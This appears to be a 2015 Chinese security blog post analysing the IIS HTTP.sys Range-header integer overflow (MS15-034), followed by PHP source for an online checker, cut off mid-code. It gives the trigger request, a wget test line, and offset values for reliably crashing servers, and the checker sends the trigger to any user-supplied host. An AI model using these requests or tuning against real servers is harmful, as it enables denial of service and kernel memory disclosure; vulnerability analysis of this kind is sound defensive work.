<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><meta name="viewport" content="initial-scale=1.0,maximum-scale=5,width=device-width,viewport-fit=cover"><title>IIS最新高危漏洞（CVE-2015-1635，MS15-034）分析以及POC在线检测源码 - 老D博客</title><meta name="keywords" content="2015-1635,HTTP.SYS,IIS漏洞,MS15-034" /><meta name="description" content="前言 在4月的补丁日，微软通过标记为“高危”的MS15-034补丁，修复了HTTP.SYS中一处远程代码漏洞CVE-2015-1635。据微软公告（https://technet.microsoft.com/en-us/library/security/MS15-034）所称，当存在该漏洞的HTTP服务器接收到精心构造的HTTP请求时，可能触发远程代码在目标系统以系统权限执行。 这是对于服务器系统..." /><meta property="og:type" content="article" /><meta property="og:url" content="https://laod.cn/code-audit/iis-http-sys-cve-2015-1635-ms15-034.html" /><meta property="og:site_name" content="老D博客" /><meta property="og:title" content="IIS最新高危漏洞（CVE-2015-1635，MS15-034）分析以及POC在线检测源码" /><meta property="og:image" content="https://laod.cn/wp-content/uploads/2015/04/lower.png" /><meta property="og:description" content="前言 在4月的补丁日，微软通过标记为“高危”的MS15-034补丁，修复了HTTP.SYS中一处远程代码漏洞CVE-2015-1635。据微软公告（https://technet.microsoft.com/en-us/library/security/MS15-034）所称，当存在该漏洞的HTTP服务器接收到精心构造的HTTP请求时，可能触发远程代码在目标系统以系统权限执行。 这是对于服务器系统..." /><link rel="canonical" href="https://laod.cn/code-audit/iis-http-sys-cve-2015-1635-ms15-034.html" /><meta name="applicable-device" content="pc,mobile" /><meta http-equiv="Cache-Control" content="no-transform" /><link rel="shortcut icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /><link rel='dns-prefetch' href='//cdn.laod.wang' /><link rel='dns-prefetch' href='//s2.ax1x.com' /><link rel='stylesheet' id='stylesheet-css' href='//laod.cn/wp-content/uploads/wpcom/style.6.8.2.1632028585.css?ver=6.8.2' type='text/css' media='all' /><link rel='stylesheet' id='font-awesome-css' href='https://laod.cn/wp-content/themes/justnews/themer/assets/css/font-awesome.css?ver=6.8.2' type='text/css' media='all' /><link rel='stylesheet' id='wp-block-library-css' href='https://laod.cn/wp-includes/css/dist/block-library/style.min.css?ver=5.9.1' type='text/css' media='all' /><style id='global-styles-inline-css' type='text/css'>body{--wp--preset--color--black:#000;--wp--preset--color--cyan-bluish-gray:#abb8c3;--wp--preset--color--white:#fff;--wp--preset--color--pale-pink:#f78da7;--wp--preset--color--vivid-red:#cf2e2e;--wp--preset--color--luminous-vivid-orange:#ff6900;--wp--preset--color--luminous-vivid-amber:#fcb900;--wp--preset--color--light-green-cyan:#7bdcb5;--wp--preset--color--vivid-green-cyan:#00d084;--wp--preset--color--pale-cyan-blue:#8ed1fc;--wp--preset--color--vivid-cyan-blue:#0693e3;--wp--preset--color--vivid-purple:#9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple:linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan:linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange:linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red:linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray:linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum:linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple:linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux:linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk:linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean:linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass:linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight:linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale:url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale:url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow:url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red:url('#wp-duotone-blue-red');--wp--preset--duotone--midnight:url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow:url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green:url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange:url('#wp-duotone-blue-orange');--wp--preset--font-size--small:13px;--wp--preset--font-size--medium:20px;--wp--preset--font-size--large:36px;--wp--preset--font-size--x-large:42px}.has-black-color{color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-color{color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-color{color:var(--wp--preset--color--white)!important}.has-pale-pink-color{color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-color{color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-color{color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-color{color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-color{color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-color{color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-color{color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-color{color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-color{color:var(--wp--preset--color--vivid-purple)!important}.has-black-background-color{background-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-background-color{background-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-background-color{background-color:var(--wp--preset--color--white)!important}.has-pale-pink-background-color{background-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-background-color{background-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-background-color{background-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-background-color{background-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-background-color{background-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-background-color{background-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-background-color{background-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-background-color{background-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-background-color{background-color:var(--wp--preset--color--vivid-purple)!important}.has-black-border-color{border-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-border-color{border-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-border-color{border-color:var(--wp--preset--color--white)!important}.has-pale-pink-border-color{border-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-border-color{border-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-border-color{border-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-border-color{border-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-border-color{border-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-border-color{border-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-border-color{border-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-border-color{border-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-border-color{border-color:var(--wp--preset--color--vivid-purple)!important}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background:var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple)!important}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background:var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan)!important}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange)!important}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red)!important}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background:var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray)!important}.has-cool-to-warm-spectrum-gradient-background{background:var(--wp--preset--gradient--cool-to-warm-spectrum)!important}.has-blush-light-purple-gradient-background{background:var(--wp--preset--gradient--blush-light-purple)!important}.has-blush-bordeaux-gradient-background{background:var(--wp--preset--gradient--blush-bordeaux)!important}.has-luminous-dusk-gradient-background{background:var(--wp--preset--gradient--luminous-dusk)!important}.has-pale-ocean-gradient-background{background:var(--wp--preset--gradient--pale-ocean)!important}.has-electric-grass-gradient-background{background:var(--wp--preset--gradient--electric-grass)!important}.has-midnight-gradient-background{background:var(--wp--preset--gradient--midnight)!important}.has-small-font-size{font-size:var(--wp--preset--font-size--small)!important}.has-medium-font-size{font-size:var(--wp--preset--font-size--medium)!important}.has-large-font-size{font-size:var(--wp--preset--font-size--large)!important}.has-x-large-font-size{font-size:var(--wp--preset--font-size--x-large)!important}</style> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/themer/assets/js/jquery-3.6.0.min.js?ver=3.6.0' id='jquery-core-js'></script> <script type='text/javascript' src='https://laod.cn/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/themer/assets/js/icons-2.6.18.js?ver=6.8.2' id='wpcom-icons-js'></script> <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://laod.cn/xmlrpc.php?rsd" /><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://laod.cn/wp-includes/wlwmanifest.xml" /><link rel="icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" sizes="32x32" /><link rel="icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" sizes="192x192" /><link rel="apple-touch-icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /><meta name="msapplication-TileImage" content="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /> <noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player,[data-lazy-src]{display:none!important}</style></noscript> <!--[if lte IE 9]><script src="https://laod.cn/wp-content/themes/justnews/js/update.js"></script><![endif]--></head><body class="post-template-default single single-post postid-511 single-format-standard lang-cn el-boxed"><header class="header"><div class="container clearfix"><div class="navbar-header"> <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse" aria-label="menu"> <span class="icon-bar icon-bar-1"></span> <span class="icon-bar icon-bar-2"></span> <span class="icon-bar icon-bar-3"></span> </button><div class="logo"> <a href="https://laod.cn" rel="home"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="老D博客" data-lazy-src="https://laod.cn/wp-content/uploads/2020/05/shinian-logo.png"><noscript><img src="https://laod.cn/wp-content/uploads/2020/05/shinian-logo.png" alt="老D博客"></noscript></a></div></div><div class="collapse navbar-collapse"><nav class="navbar-left primary-menu"><ul id="menu-x" class="nav navbar-nav wpcom-adv-menu"><li class="zmzm-shouye menu-item"><a href="https://laod.cn">首页</a></li><li class="zmzm-feiji1 menu-item"><a href="https://laod.cn/hosts">hosts</a></li><li class="zmzm-gongju menu-item"><a href="https://laod.cn/tools">工具软件</a></li><li class="zmzm-code menu-item current-post-ancestor current-post-parent active"><a href="https://laod.cn/code-audit">代码审计</a></li><li class="zmzm-keji menu-item"><a href="https://laod.cn/black-technology">黑科技</a></li><li class="zmzm-liuyan menu-item"><a href="https://laod.cn/guestbook">留言版</a></li><li class="zmzm-gengduo menu-item menu-item-style menu-item-style1 dropdown"><a href="#" class="dropdown-toggle">查看更多</a><ul class="dropdown-menu menu-item-wrap menu-item-col-4"><li class="zmzm-dianying menu-item"><a href="https://laod.cn/movie">电影·美剧</a></li><li class="zmzm-anquan menu-item"><a href="https://laod.cn/security">网络安全</a></li><li class="zmzm-zixun menu-item"><a href="https://laod.cn/news">业界资讯</a></li><li class="zmzm-mianfei-copy menu-item"><a href="https://laod.cn/free">免费资源</a></li></ul></li></ul></nav><div class="navbar-action pull-right"><div class="navbar-search-icon j-navbar-search"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-search"></use></svg></i></div><div id="j-user-wrap"> <a class="login" href="https://laod.cn/login?modal-type=login">登录</a> <a class="login register" href="https://laod.cn/register?modal-type=register">注册</a></div></div><form class="navbar-search" action="https://laod.cn" method="get" role="search"><div class="navbar-search-inner"> <i class="wpcom-icon wi navbar-search-close"><svg aria-hidden="true"><use xlink:href="#wi-close"></use></svg></i> <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value=""> <button class="navbar-search-btn" type="submit"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-search"></use></svg></i></button></div></form></div></div></header><div id="wrap"><div class="wrap container"><main class="main"><article id="post-511" class="post-511 post type-post status-publish format-standard hentry category-code-audit tag-2015-1635 tag-http-sys tag-iis tag-ms15-034 entry"><div class="entry-main"><div class="entry-head"><h1 class="entry-title">IIS最新高危漏洞（CVE-2015-1635，MS15-034）分析以及POC在线检测源码</h1><div class="entry-info"> <time class="entry-date published" datetime="2015-04-16T11:54:45+08:00" pubdate> 2015-04-16 11:54 </time> <span class="dot">•</span> <a href="https://laod.cn/code-audit" rel="category tag">代码审计</a> <span class="dot">•</span> <span>阅读 9829</span></div></div><div class="entry-content text-indent"><p><strong>前言</strong></p><p><strong>在4月的补丁日，微软通过标记为“高危”的MS15-034补丁，修复了HTTP.SYS中一处远程代码漏洞CVE-2015-1635。据微软公告（https://technet.microsoft.com/en-us/library/security/MS15-034）所称，当存在该漏洞的HTTP服务器接收到精心构造的HTTP请求时，可能触发远程代码在目标系统以系统权限执行。</strong></p><p>这是对于服务器系统影响不小的安全漏洞，任何安装了微软IIS 6.0以上的的Windows Server 2008 R2/Server 2012/Server 2012 R2以及Windows 7/8/8.1操作系统都受到这个漏洞的影响。</p><p>从微软的公告致谢来看，这个漏洞是由“Citrix Security Response Team”（美国思杰公司的安全响应团队）发现，从网上公开的信息来看，Citrix公司是一家从事云计算虚拟化、虚拟桌面和远程接入技术领域的高科技企业。这也引发了Twitter上很多关于该漏洞是否是由针对Citrix公司的APT攻击中发现的疑问，而就在微软发布补丁的不到12个小时内，便有匿名用户在Pastebin网站上贴出了针对这个漏洞可用的概念验证攻击代码，似乎也印证了这一点。</p><p><strong>笔者和360Vulcan的小伙伴们获得该信息后，就开始针对其进行深入的分析，并在12小时内初步分析清楚了漏洞的原理和利用相关信息，下面就将我们分析的一些结果分享给大家，以便更好地促进安全社区理解和防御这一高危安全漏洞。</strong></p><p><strong>漏洞重现</strong></p><p>结合Pastebin网站上贴出的信息（http://pastebin.com/ypURDPc4）和微软公告，我们知道这是一个位于HTTP.SYS中的整数溢出漏洞，根据Pastebin网站的python代码，我们知道通过给IIS服务器发送这样格式的HTTP请求，就可以触发（检测）这个漏洞：</p><pre class="lang:default decode:true ">GET / HTTP/1.1
Host: stuff
Range: bytes=0-18446744073709551615</pre><p>我们直接使用wget或curl工具，也可以直接测试这个漏洞，例如使用如下命令行：</p><pre class="lang:default decode:true ">wget 127.0.0.1 –debug –header=”Range: bytes=0-18446744073709551615″</pre><p>&nbsp;</p><p><strong>此处18446744073709551615转为十六进制即是 0xFFFFFFFFFFFFFFFF(16个F），是64位无符号整形所能表达的最大整数，那么我们很容易可以想到，这个“整数溢出”必然同这个异常的超大整数有关。</strong></p><p>Pastebin上POC的作者提供的检测工具代码认为，如上请求包，若IIS服务器返回“Requested Range Not Satisfiable”，则是存在漏洞，否则如果返回”The request has an invalid header name“，则说明漏洞已经修补。</p><p>在实测中可能很多人也会发现并非如此，针对不同的服务器，这个测试程序很可能导致服务器直接BSOD甚至直接引发VM进程Crash(对于虚拟主机），这是为什么呢？这究竟是发生在何处的什么原因的整数一处呢？在下面的小节中我们将会进一步讲到。</p><p><strong>漏洞原理分析</strong></p><p><strong>HTTP.SYS是微软从IIS6.0开始，为了在Windows平台上优化IIS服务器性能而引入的一个内核模式驱动程序。它为IIS及其他需要运用HTTP协议的微软服务器功能提供HTTP请求的接收与响应、快速缓存、提高性能、日志等功能服务。</strong></p><p>更多关于HTTP.SYS的信息，可以参考微软Technet Library中”IIS 6.0 Architecture”中的“HTTP Protocol Stack”一章（https://technet.microsoft.com/en-us/library/cc739400(v=ws.10).aspx)。 HTTP.SYS提供了两个最重要的功能是Kernel-mode caching 和Kernel mode request queuing，而本次的安全漏洞就出在Kernel mode caching（内核模式缓存）中。</p><p><strong>这里笔者以Windows 8.1 X86平台上安装的IIS 8.5为例进行分析讲解，这里我们分析的存在漏洞的HTTP.SYS版本号为6.3.9600.16520，修补后的http.sys版本为6.3.9600.17712</strong></p><p>Pastebin上POC代码的匿名作者提到，补丁修补了http!UlpParseRange函数，通过RtlUlonglongAdd函数实现了修补/拦截。</p><p>从测试代码和函数名上，我们都可以看出这个漏洞同HTTP头中的”Range“域有直接的关系， Range请求是HTTP协议中HTTP客户端用于只获取服务器上文件的某一部分数据的请求域，更多关于Range请求的细节和规范，可以参考RFC 7233 “Hypertext Transfer Protocol (HTTP/1.1): Range Requests”(http://www.rfc-editor.org/rfc/rfc7233.txt)。</p><p><strong>这里先简单介绍一下http.sys缓存工作的原理，IIS进程w3wp.exe接收到HTTP请求后，将数据缓存到内核中，并整合HTTP回应头，最后由http.sys组织数据包经由网络内核组件发送出去。请求中包括Ranges对象的指定范围，而缓存中则包含了http文件和大小信息等。</strong></p><p>我们接下来先来看看这个UlpParseRange函数，看他是否是这个漏洞的根本原因。</p><p>UlpParseRange的整个代码比较长，这里就不全部贴出了，函数的逻辑很简单，就是从Range bytes=lower-upper（也可以是lower-或-upper形式）中，解析出lower（即读取范围的开始offset）和upper（即读取范围的结束offset)），然后计算要读取的长度，在正常的情况下，upper大于lower，因此长度=upper-lower +1</p><p><strong>这里如果是测试代码中的例子，lower=0 ，upper=0xFFFFFFFFFFFFFFFF</strong></p><p>我们看看未修补前的代码是怎么样写的</p><p><a href="https://laod.cn/wp-content/uploads/2015/04/lower.png"><img class=" size-full wp-image-512 aligncenter" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20777%20127'%3E%3C/svg%3E" alt="lower" width="777" height="127" data-lazy-src="https://laod.cn/wp-content/uploads/2015/04/lower.png" /><noscript><img class=" size-full wp-image-512 aligncenter" src="https://laod.cn/wp-content/uploads/2015/04/lower.png" alt="lower" width="777" height="127" /></noscript></a></p><p>&nbsp;</p><p>通过汇编代码我们可知，这里是将upper先减去lower，再加1，得到两者之间的长度差距（例如 bytes=20-50, 则50-20+1 , 两者之间有31个字节）</p><p>按照例子里的写法，就是0xFFFFFFFFFFFFFFFF – 0 + 1 ， 确实发生了整数溢出，64位无符号整数上溢为0。</p><p>我们来看修改后的版本：</p><p><a href="https://laod.cn/wp-content/uploads/2015/04/upper.png"><img class=" size-full wp-image-513 aligncenter" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20955%20145'%3E%3C/svg%3E" alt="upper" width="955" height="145" data-lazy-src="https://laod.cn/wp-content/uploads/2015/04/upper.png" /><noscript><img class=" size-full wp-image-513 aligncenter" src="https://laod.cn/wp-content/uploads/2015/04/upper.png" alt="upper" width="955" height="145" /></noscript></a></p><p><strong>这里的代码是将upper 先减去 lower，然后再用RtlUlonglongAdd 将结果同1相加，这里RtlUlonglongAdd会做安全性检查，如果相加结果溢出，则会返回STATUS_INTEGER_OVERFLOW.</strong></p><p>由于测试代码中lower传入的是0，所以这里也发生了溢出并被捕获、阻止，但如果lower != 0，这里压根就不会捕获到整数溢出，这是怎么回事呢？真正出现问题的地方是这里吗？</p><p>实际上，这可能是POC编写者故意隐藏了一点关键细节： UlpParseRange通过操纵Range参数可以引发整数溢出，也确实被进行了修补，但是并非这个Range数据真正出现问题的地方。</p><p>我们进一步推测和分析，发现本次漏洞真正利用的地方，而是UlAdjustRangesToContentSize，这个函数用于最终修正Ranges中指定的StartingOffset和Length的合法性。</p><p><strong>首先UrlpParseRange解析了Range参数并获得StartingOffset和Length后，会将其保存在http请求的对象中，而在解析到对应的缓存后，对比Offset + Length的大小，是否超过要请求的缓存文件数据长度，如果超出了，就要把length裁剪为适合的长度，防止读取超出的数据，见如下代码：</strong></p><p><a href="https://laod.cn/wp-content/uploads/2015/04/Length-offset.png"><img class=" size-full wp-image-514 aligncenter" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201102%20291'%3E%3C/svg%3E" alt="Length + offset" width="1102" height="291" data-lazy-src="https://laod.cn/wp-content/uploads/2015/04/Length-offset.png" /><noscript><img class=" size-full wp-image-514 aligncenter" src="https://laod.cn/wp-content/uploads/2015/04/Length-offset.png" alt="Length + offset" width="1102" height="291" /></noscript></a></p><p>&nbsp;</p><p>这里我们看到是一处可利用的整数溢出，Length + offset 如果发生溢出，就会小于contentsize，这里就会跳过这个”adjust”的过程，Length没有得到任何处理和修正，我们成功控制了Length。</p><p>以例子中的数值为例， length + offset = (0xFFFFFFFFFFFFFFFF + 1 ) + 0 (这个+ 1是前面UlpParseRange添加的） = 0 ，小于contentsize</p><p><strong>而假设lower不为0，则结果 = lower ,只要结果小于contentsize，也是不会被adjust的。</strong></p><p>也就是说，UlpParseRange处发生了整数溢出，而在此处导致了安全检查的绕过，同时，如果lower != 0 ，UlpParseRange时不会被触发整数溢出，而是应该在这里得以触发。</p><p>到这里我们就弄清楚了这个漏洞的触发流程和原理：</p><pre class="lang:default decode:true ">1.upper(range结束的offset) = 0xFFFFFFFFFFFFFFFF时，UlpParseRange或UlAdjustRangesToContentSize会触发整数溢出,导致绕过UlAdjustRangesToContentSize的Length检查
2. Length 可控，但是Length = 0xFFFFFFFFFFFFFFFF – lower（range开始的offset） ， 且lower必须要小于要获取目标文件的数据长度contentlength。</pre><p>&nbsp;</p><p><strong>BSOD的重现和原理</strong></p><p>看到很多测试攻击程序的研究人员都无法稳定重现BSOD，看Github上的讨论，通过调整lower的数值，有些人可以打蓝Server 2012 R2，有些人就不行，或者换个文件就不行。</p><p><strong>实际上，我们分析了这个漏洞的原理就可以很清楚的了解其中的规律了，首先一条原则是上面已经说到的lower不能大于请求的content length，例如假设请求iisstart.htm(648Bytes），lower就必须小于647。</strong></p><p>同时，HTTP请求的处理实际是先通过w3wp发起的进程上下文内http先解析HTTP请求包，组合成紧凑的http回应包后，通过UlSendData-&gt;UxTpTransmitPacket-&gt;UxpTpEnqueueTransmitPacket排入队列，然后再由UlSendCacheEntryWorker将其发送出去，在这个过程中，如果range指定的数据开始offset小于紧凑的数据包头部的总长度，那么就不会触发到后面继续命中缓存的处理。（range只允许对数据文件内存指定，不能指定响应头内的）</p><p>这里我使用wget添加头部的方式测试，回应包的长度应该是(针对Windows 8.1 X86)310个字节，也就是说，lower必须大于等于310个字节，其他的发送还需要调整这个数值。</p><p>所以，针对iisstart.htm , lower &gt;= 310 且 &lt; 647 就可以稳定触发BSOD了</p><p><strong>进一步利用</strong></p><p><strong>这个漏洞难道只能BSOD吗？说好的远程代码执行呢？再深入看下漏洞触发的细节，看上去似乎不能远程代码执行，但是远程读取服务器内核内存数据是有可能的。</strong></p><p>在UlpSendCacheEntry-&gt;UlBuildFastRangeCacheMdlChain中，http.sys会为HTTP回应头和缓存来源buffer/length（我们可控）创建MDL，那么，对于我们的超长length，就会创造一个巨大的mdl，接着放入UxTpTransmitPacket的数据包对象中，通过tcpip-&gt;netio，最后解析MDL，将数据最终发出去。</p><p><strong>此时是可以超过缓存的空间，读取缓存内存往后的数据，如果缓存内存后面是连续的0xffffffffffffffff – lower(4GB?)左右内核内存（通常是X64)，就有可能实现信息泄露。</strong></p><p>不过首先是很难有连续的4G内存，同时通过IIS也很难一下获得如此多的数据，那么只能设法降低这个内存要求：length = 0xFFFFFFFFFFFFFFFF – lower ，且lower &lt; contetnlength才行，我们可以想办法提高content length，达到降低Length的目的，例如在服务器上寻找一个接近4GB大小的文件：）<span id="more-511"></span></p><h1>POC及在线检测源码</h1><p><a href="https://laod.cn/wp-content/uploads/2015/04/HTTP.sys_.png"><img class=" size-full wp-image-515 aligncenter" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20649%20725'%3E%3C/svg%3E" alt="HTTP.sys" width="649" height="725" data-lazy-src="https://laod.cn/wp-content/uploads/2015/04/HTTP.sys_.png" /><noscript><img class=" size-full wp-image-515 aligncenter" src="https://laod.cn/wp-content/uploads/2015/04/HTTP.sys_.png" alt="HTTP.sys" width="649" height="725" /></noscript></a></p><p class="subheading"><strong>HTTP.sys远程执行代码漏洞（CVE-2015-1635，MS15-034）</strong></p><p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。<a href="https://technet.microsoft.com/zh-cn/library/security/MS15-034">https://technet.microsoft.com/zh-cn/library/security/MS15-034</a></p><p><strong>在线检测源码</strong></p><p><a href="https://laod.cn/wp-content/uploads/2015/04/HTTP.sys在线检测源码.jpg"><img class="alignnone size-full wp-image-516" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20900%20418'%3E%3C/svg%3E" alt="HTTP.sys在线检测源码" width="900" height="418" data-lazy-src="https://laod.cn/wp-content/uploads/2015/04/HTTP.sys在线检测源码.jpg" /><noscript><img class="alignnone size-full wp-image-516" src="https://laod.cn/wp-content/uploads/2015/04/HTTP.sys在线检测源码.jpg" alt="HTTP.sys在线检测源码" width="900" height="418" /></noscript></a></p><pre class="lang:php decode:true ">&lt;?php


class VulnStatus
{
const FAIL        = 0;
const VULN        = 1;
const VULN_NOT_MS = 2;
const PATCHED     = 3;
const NOT_VULN    = 4;
const NOT_VULN_MS = 5;
const NOT_VULN_CF = 6;

public static function AsString( $status, $host )
{
switch( $status )
{
case self::FAIL       : return ';&lt;div class="alert alert-warning"&gt;无法连接到 &lt;b&gt;'; . $host . ';&lt;/b&gt; 测试漏洞。&lt;/div&gt;';;
case self::VULN       : return ';&lt;div class="alert alert-danger"&gt;&lt;b&gt;'; . $host . ';&lt;/b&gt; 存在漏洞。&lt;/div&gt;';;
case self::VULN_NOT_MS: return ';&lt;div class="alert alert-warning"&gt;&lt;b&gt;'; . $host . ';&lt;/b&gt; 可能存在漏洞，但它好像没使用IIS。&lt;/div&gt;';;
case self::PATCHED    : return ';&lt;div class="alert alert-success"&gt;&lt;b&gt;'; . $host . ';&lt;/b&gt; 已修复。&lt;/div&gt;';;
case self::NOT_VULN   : return ';&lt;div class="alert alert-info"&gt;不能识别补丁状态 &lt;b&gt;'; . $host . ';&lt;/b&gt;, 并没有使用IIS，可能不存在漏洞。&lt;/div&gt;';;
case self::NOT_VULN_MS: return ';&lt;div class="alert alert-info"&gt;不能识别补丁状态 &lt;b&gt;'; . $host . ';&lt;/b&gt;. 可能不存在漏洞。&lt;/div&gt;';;
case self::NOT_VULN_CF: return ';&lt;div class="alert alert-success"&gt;&lt;b&gt;'; . $host . ';&lt;/b&gt; 老D提示：可能使用了CloudFlare CDN加速，导致漏洞无法检测或不存在。&lt;/div&gt;';;
}

return ';好像坏了';;
}
}

$host = false;
$status = false;
$url = filter_input( INPUT_GET, ';host';, FILTER_SANITIZE_URL );

if( !empty( $url ) &amp;&amp; parse_url( $url, PHP_URL_SCHEME ) === null )
{
$url = ';http://'; . $url;
}

$port = parse_url( $url, PHP_URL_PORT );

if( $port === null )
{
$port = 80;
}

$url = parse_url( $url, PHP_URL_HOST );

if( $url !== null )
{
$cachekey = ';ms15034_'; . $url . ';_'; . $port;
$cachetime = 300; // 5 minutes

$host = htmlspecialchars( $url, ENT_HTML5 );

if( $port !== 80 )
{
$host .= ';:'; . $port;
}

$memcached = new Memcached( );
$memcached-&gt;addServer( ';/var/run/memcached/memcached.sock';, 0 );

$status = $memcached-&gt;get( $cachekey );

if( $status === false )
{
$fp = @fsockopen( $url, $port, $errno, $errstr, 5 );

if( $fp === false )
{
$status = VulnStatus::FAIL;
}
else
{
stream_set_timeout( $fp, 5 );

$header = "GET / HTTP/1.1\r\n";
$header .= "Host: stuff\r\n";
$header .= "Range: bytes=0-18446744073709551615\r\n";
$header .= "Connection: close\r\n\r\n";

fwrite( $fp, $header );

$response = fread( $fp, 1024 );

fclose( $fp );

if( strpos( $response, ';您的请求范围不符合'; ) !== false )
{
$status = strpos( $response, ';Microsoft'; ) === false ? VulnStatus::VULN_NOT_MS : VulnStatus::VULN;
}
else if( strpos( $response, ';请求一个无效的header头部'; ) !== false )
{
$cachetime = 3600; // 缓存时间
$status = VulnStatus::PATCHED;
}
else if( strpos( $response, ';Microsoft'; ) === false )
{
